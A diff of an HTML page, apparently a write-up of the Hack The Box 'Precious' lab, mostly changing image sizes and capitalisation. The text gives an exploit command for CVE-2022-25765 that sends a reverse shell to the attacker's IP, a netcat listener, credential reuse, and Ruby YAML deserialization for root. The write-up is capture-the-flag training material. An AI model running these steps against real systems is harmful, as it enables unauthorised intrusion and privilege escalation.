@@ -10,38 +10,42 @@
             color: black;
             background-color: whitesmoke;
         }
+        img {
+            width: 50%;
+            height: 50%;
+        }
     </style>
 </head>
 
 <body>
     <h1>HTB - Precious</h1>
     <p>Nmaping the ip give to us:</p>
-    <img src="img/1.png" alt="1" width=600px height=300px>
+    <img src="img/1.png" alt="1">
     <p>Since pasting the ip into the browser did not connect, we need to add to /etc/hosts file for DNS.</p>
-    <img src="img/2.png" alt="2" width=600px height=300px>
+    <img src="img/2.png" alt="2">
     <p>The box info tells us it is vulnerable to CVE-2022-25765</p>
     <p>Running exploit this
         <a href="https://github.com/UNICORDev/exploit-CVE-2022-25765?tab=readme-ov-file">github</a>
         page, we can get a reverse shell. </p>
     <p>python3 exploit-CVE-2022-25765.py -s 10.10.16.8 1008 -w http://precious.htb -p url</p>
     <p>sudo nc -lvnp 1008</p>
-    <img src="img/3.png" alt="3" width=600px height=300px>
+    <img src="img/3.png" alt="3">
     <p>In the home directory the .bundle is found with a config file holding the creds to Henry.</p>
-    <img src="img/4.png" alt="4" width=600px height=300px>
-    <p>we ssh into henry and get the first flag, user.txt</p>
-    <p>running sudo -l we find henry has access to update_dependencies.rb</p>
-    <img src="img/5.png" alt="5" width=75% height=100%>
-    <p>trying to run the update_dependencies.rb we get an error</p>
-    <img src="img/6.png" alt="6" width=75% height=100%>
-    <p>google for ruby deserialization:
+    <img src="img/4.png" alt="4">
+    <p>We ssh into henry and get the first flag, user.txt.</p>
+    <p>Running sudo -l we find henry has access to update_dependencies.rb.</p>
+    <img src="img/5.png" alt="5">
+    <p>Trying to run the update_dependencies.rb we get an error.</p>
+    <img src="img/6.png" alt="6">
+    <p>Google for ruby deserialization:
     <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md">
         github</a></p>
-    <p>i would make the dependences.yml in /dev/shm with nano and the Universal gadget for ruby 2.x - 3.x. script</p>
-    <p>running the script would show the id of having root</p>
-    <img src="img/7.png" alt="7" width=50% height="100">
-    <p>changing the script’s part of git_set to /bin/bash will get into root and the flag</p>
-    <img src="img/8.png" alt="8" width=50% height="100">
-    <img src="img/9.png" alt="9" width=50% height="100">
+    <p>I would make the dependences.yml in /dev/shm with nano, and the Universal gadget for ruby 2.x - 3.x. script.</p>
+    <p>Running the script would show the ID of having root</p>
+    <img src="img/7.png" alt="7">
+    <p>Changing the script's part of git_set to /bin/bash will get into root, and the flag.</p>
+    <img src="img/8.png" alt="8">
+    <img src="img/9.png" alt="9">
 </body>
 
 </html>
